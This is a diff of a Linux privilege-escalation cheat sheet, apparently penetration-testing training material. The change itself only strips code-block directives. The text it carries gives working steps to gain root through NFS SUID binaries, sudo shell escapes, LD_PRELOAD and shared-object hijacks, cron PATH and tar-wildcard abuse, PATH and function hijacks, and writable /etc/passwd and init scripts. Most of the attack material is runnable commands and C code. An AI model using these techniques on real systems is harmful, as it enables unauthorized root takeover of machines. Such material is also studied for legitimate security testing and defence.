@@ -14,7 +14,6 @@ Root squashing maps files owned by root (uid 0) to a different ID (e.g. anonymou
 
 On your local machine, check that the NFS share is accessible:
 
-.. code-block:: none
 
     # showmount -e 10.0.0.1
     Export list for 10.0.0.1:
@@ -22,7 +21,6 @@ On your local machine, check that the NFS share is accessible:
 
 On your local machine, make a directory to mount the remote share, and then mount it:
 
-.. code-block:: none
 
     # mkdir /tmp/mount
     # mount -o rw,vers=2 10.0.0.1:/tmp /tmp/mount
@@ -31,7 +29,6 @@ On your local machine, make a directory to mount the remote share, and then moun
 
 Create an executable that calls /bin/bash with root level permissions in the mounted share and set the SUID bit:
 
-.. code-block:: none
 
     int main() {
         setresuid(0,0,0);
@@ -39,7 +36,6 @@ Create an executable that calls /bin/bash with root level permissions in the mou
         system("/bin/bash");
     }
 
-.. code-block:: none
 
     # gcc -o rootsh rootsh.c
     # cp rootsh /tmp/mount
@@ -47,20 +43,17 @@ Create an executable that calls /bin/bash with root level permissions in the mou
 
 Now, back on the remote host, execute the executable to spawn a root shell:
 
-.. code-block:: none
 
     $ /tmp/rootsh
     #
 
 Alternatively, on the remote host, copy the /bin/bash or /bin/sh binary to the NFS directory:
 
-.. code-block:: none
 
     $ cp /bin/bash /tmp
 
 On your local machine, after mounting the NFS share, create new copies of the files (or chown them to root) and set the SUID/SGUID bits:
 
-.. code-block:: none
 
     # cp bash rootbash
     # chmod +s rootbash
@@ -72,7 +65,6 @@ On your local machine, after mounting the NFS share, create new copies of the fi
 
 Now, back on the remote host, run the file. For bash / sh, use the -p command line option to preserve the SUID/SGID (otherwise shell will simply spawn as your own user).
 
-.. code-block:: none
 
     $ /tmp/rootbash -p
     #
@@ -88,7 +80,6 @@ Sudo
 Shell Escape Sequences
 ----------------------
 
-.. code-block:: none
 
     $ sudo -l
     Matching Defaults entries for user on this host:
@@ -110,7 +101,6 @@ Shell Escape Sequences
 vim / vi
 ^^^^^^^^
 
-.. code-block:: none
 
     $ sudo vim --cmd sh
     #
@@ -118,7 +108,6 @@ vim / vi
     $ sudo vi --cmd sh
     #
 
-.. code-block:: none
 
     $ sudo vim -c sh
     #
@@ -126,7 +115,6 @@ vim / vi
     $ sudo vi -c sh
     #
 
-.. code-block:: none
 
     $ sudo vim
     :!sh
@@ -139,7 +127,6 @@ vim / vi
 man
 ^^^
 
-.. code-block:: none
 
     $ sudo man ls
     !sh
@@ -148,7 +135,6 @@ man
 less
 ^^^^
 
-.. code-block:: none
 
     $ sudo less /path/to/large/file
     !sh
@@ -157,7 +143,6 @@ less
 more
 ^^^^
 
-.. code-block:: none
 
     $ sudo more /path/to/large/file
     !sh
@@ -166,7 +151,6 @@ more
 iftop
 ^^^^^
 
-.. code-block:: none
 
     $ sudo iftop
     !sh
@@ -175,7 +159,6 @@ iftop
 gdb
 ^^^
 
-.. code-block:: none
 
     $ sudo gdb
     (gdb) shell sh
@@ -184,7 +167,6 @@ gdb
 ftp
 ^^^
 
-.. code-block:: none
 
     $ ftp
     ftp> !
@@ -193,7 +175,6 @@ ftp
 find
 ^^^^
 
-.. code-block:: none
 
     $ sudo find /bin -name ls -exec /bin/sh \;
     #
@@ -201,7 +182,6 @@ find
 awk
 ^^^
 
-.. code-block:: none
 
     $ sudo awk 'BEGIN {system("/bin/sh")}'
     #
@@ -209,13 +189,11 @@ awk
 nmap
 ^^^^
 
-.. code-block:: none
 
     $ sudo nmap --interactive
     !sh
     #
 
-.. code-block:: none
 
     $ echo "os.execute('/bin/sh')" > shell.nse
     $ sudo nmap --script=shell.nse
@@ -224,7 +202,6 @@ nmap
 nano
 ^^^^
 
-.. code-block:: none
 
     $ sudo nano -s /bin/sh
     sh
@@ -233,7 +210,6 @@ nano
 Abusing Intended Functionality
 ------------------------------
 
-.. code-block:: none
 
     $ sudo apache2 -f /etc/shadow
     Syntax error on line 1 of /etc/shadow:
@@ -249,7 +225,6 @@ Environment variables:
 
 Sudo has the ability to preserve certain environment variables:
 
-.. code-block:: none
 
     $ sudo -l
     Matching Defaults entries for user on this host:
@@ -257,7 +232,6 @@ Sudo has the ability to preserve certain environment variables:
 
 Compile a shared object (.so) file:
 
-.. code-block:: none
 
     #include <stdio.h>
     #include <sys/types.h>
@@ -270,13 +244,11 @@ Compile a shared object (.so) file:
         system("/bin/bash");
     }
 
-.. code-block:: none
 
     $ gcc -fPIC -shared -nostartfiles -o preload.so preload.c
 
 Set the environment variable as part of the sudo command. The full path to the .so file needs to be used. Your user must be able to run the command via sudo.
 
-.. code-block:: none
 
     $ sudo LD_PRELOAD=/full/path/tp/preload.so apache2
     #
@@ -289,7 +261,6 @@ Path
 
 If PATH variable defined inside a crontab, and one of the paths is writable, and the cron job doesn't refer to an absolute path, we can exploit.
 
-.. code-block:: none
 
     $ cat /etc/crontab
     SHELL=/bin/sh
@@ -301,7 +272,6 @@ In the example above, /home/user is in the PATH and our user can write to it.
 
 Create a /home/user/overwrite.sh script which makes a SUID/SGID bit version of bash:
 
-.. code-block:: none
 
     #!/bin/bash
     cp /bin/bash /tmp/rootbash
@@ -309,13 +279,11 @@ Create a /home/user/overwrite.sh script which makes a SUID/SGID bit version of b
 
 Make the script executable:
 
-.. code-block:: none
 
     $ chmod +x /home/user/overwrite.sh
 
 Now wait for the cron job to execute. When it does, execute the /tmp/rootbash binary and get a root shell. Remember to use the -p command line option to preserve the SUID/SGID:
 
-.. code-block:: none
 
     $ /tmp/rootbash -p
     #
@@ -325,13 +293,11 @@ Wildcards
 
 If the cron job script contains bash wildcards that reference files, and we can create files in the relevant directory, it may be possible to create files with filenames that can be used as command line flags.
 
-.. code-block:: none
 
     $ cat /etc/crontab
     ...
     * * * * * root /usr/local/bin/compress.sh
 
-.. code-block:: none
 
     $ cat /usr/local/bin/compress.sh
     #!/bin/sh
@@ -342,7 +308,6 @@ The tar executable has a checkpoint feature which displays progress messages eve
 
 Create a script (runme.sh) which makes a SUID/SGID bit version of bash:
 
-.. code-block:: none
 
     #!/bin/bash
     cp /bin/bash /tmp/rootbash
@@ -350,20 +315,17 @@ Create a script (runme.sh) which makes a SUID/SGID bit version of bash:
 
 Make the script executable:
 
-.. code-block:: none
 
     $ chmod +x runme.sh
 
 Create two files in the directory that the tar command is run in, with the filename set to the full command line options:
 
-.. code-block:: none
 
     touch /home/user/--checkpoint=1
     touch /home/user/--checkpoint-action=exec=sh\ runme.sh
 
 Now wait for the cron job to execute. When it does, execute the /tmp/rootbash binary and get a root shell. Remember to use the -p command line option to preserve the SUID/SGID:
 
-.. code-block:: none
 
     $ /tmp/rootbash -p
     #
@@ -373,13 +335,11 @@ File Overwrite
 
 If a cron job script is writable, we can modify it and run commands as root:
 
-.. code-block:: none
 
     $ cat /etc/crontab
     ...
     * * * * * root overwrite.sh
 
-.. code-block:: none
 
     $ locate overwrite.sh
     /usr/local/bin/overwrite.sh
@@ -390,7 +350,6 @@ The /usr/local/bin/overwrite.sh file is world-writable.
 
 Overwrite the /usr/local/bin/overwrite.sh script with one that makes a SUID/SGID bit version of bash:
 
-.. code-block:: none
 
     #!/bin/bash
     cp /bin/bash /tmp/rootbash
@@ -398,7 +357,6 @@ Overwrite the /usr/local/bin/overwrite.sh script with one that makes a SUID/SGID
 
 Now wait for the cron job to execute. When it does, execute the /tmp/rootbash binary and get a root shell. Remember to use the -p command line option to preserve the SUID/SGID:
 
-.. code-block:: none
 
     $ /tmp/rootbash -p
     #
@@ -411,13 +369,11 @@ Writable /etc/passwd
 
 On some \*nix distributions, if /etc/passwd is writable, we can add a new root user with no password, since the only thing that matters is the uid being 0:
 
-.. code-block:: none
 
     $ echo newroot::0:0:root:/root:/bin/bash >> /etc/passwd
 
 Now use su to switch user:
 
-.. code-block:: none
 
     $ su newroot
     #
@@ -432,7 +388,6 @@ Shared Objects (.so) are the \*nix equivalent of Windows DLLs. If a program refe
 
 Find SUID/SGID binaries:
 
-.. code-block:: none
 
     $ find / -type f -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null
     -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
@@ -466,7 +421,6 @@ Find SUID/SGID binaries:
 
 Use strace to find references to shared objects:
 
-.. code-block:: none
 
     $ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
     access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
@@ -489,7 +443,6 @@ The shared object /home/user/.config/libcalc.so is referenced, but it doesn't ex
 
 Create a C program (libcalc.c) and compile it to a shared object:
 
-.. code-block:: none
 
     #include <stdio.h>
     #include <stdlib.h>
@@ -501,20 +454,17 @@ Create a C program (libcalc.c) and compile it to a shared object:
         system("/bin/bash");
     }
 
-.. code-block:: none
 
     $ gcc -shared -fPIC -o libcalc.so libcalc.c
 
 Move the libcalc.so shared object to the path referenced by the SUID binary:
 
-.. code-block:: none
 
     $ mkdir -p /home/user/.config
     $ cp libcalc.so /home/user/.config/libcalc.so
 
 Now run the SUID binary, it should give you a root shell immediately:
 
-.. code-block:: none
 
     $ suid-so
     Calculating something, please wait...
@@ -530,7 +480,6 @@ Environment Variables - Relative Paths
 
 Find SUID/SGID binaries:
 
-.. code-block:: none
 
     $ find / -type f -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null
     -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
@@ -563,7 +512,6 @@ Find SUID/SGID binaries:
 
 Use strings to find any strings in the executable, especially system commands:
 
-.. code-block:: none
 
     $ strings /usr/local/bin/suid-env
     /lib64/ld-linux-x86-64.so.2
@@ -586,7 +534,6 @@ The "service" command doesn't have an absolute path. When it is called, \*nix wi
 
 First create a C program (service.c):
 
-.. code-block:: none
 
     int main() {
         setresuid(0,0,0);
@@ -596,19 +543,16 @@ First create a C program (service.c):
 
 Compile it to our malicious binary:
 
-.. code-block:: none
 
     $ gcc -o /tmp/service service.c
 
 Add /tmp to the start of the PATH environment variable and export it:
 
-.. code-block:: none
 
     $ export PATH=/tmp:$PATH
 
 Now run the original SUID/SGID binary. A root shell should spawn:
 
-.. code-block:: none
 
     $ /usr/local/bin/suid-env
     #
@@ -618,7 +562,6 @@ Environment Variables - Absolute Paths
 
 Find SUID/SGID binaries:
 
-.. code-block:: none
 
     $ find / -type f -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null
     -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
@@ -651,7 +594,6 @@ Find SUID/SGID binaries:
 
 Use strings to find any strings in the executable, especially system commands:
 
-.. code-block:: none
 
     $ strings /usr/local/bin/suid-env2
     /lib64/ld-linux-x86-64.so.2
@@ -675,19 +617,16 @@ Some versions of Bash (<4.2-048) and Dash let you define functions with the same
 
 Define a bash function "/usr/sbin/service" that creates an SUID/SGID version of bash:
 
-.. code-block:: none
 
     $ function /usr/sbin/service() { cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p;}
 
 Export the new function:
 
-.. code-block:: none
 
     $ export -f /usr/sbin/service
 
 Now run the original SUID/SGID binary. A root shell should spawn:
 
-.. code-block:: none
 
     $ /usr/local/bin/suid-env2
     #
@@ -696,7 +635,6 @@ Bash also supports a script debugging mode, and uses the PS4 environment variabl
 
 We can get an instance root shell:
 
-.. code-block:: none
 
     env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod +s /tmp/rootbash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/rootbash -p'
 
@@ -707,14 +645,12 @@ Startup scripts are stored under /etc/init.d, and are usually run with elevated 
 
 Find world-writable startup scripts:
 
-.. code-block:: none
 
     $ find /etc/init.d -perm -o+w -type f -exec ls -l {} \; 2>/dev/null
     -rwxr-xrwx 1 root root 801 May 14  2017 /etc/init.d/rc.local
 
 Edit the script and add some code that creates an SUID/SGID bash shell:
 
-.. code-block:: none
 
     cp /bin/bash /tmp/rootbash
     chown root:root /tmp/rootbash
@@ -722,7 +658,6 @@ Edit the script and add some code that creates an SUID/SGID bash shell:
 
 Now restart the remote host, and once the host is restarted, spawn a root shell:
 
-.. code-block:: none
 
     $ /tmp/rootbash -p
     #
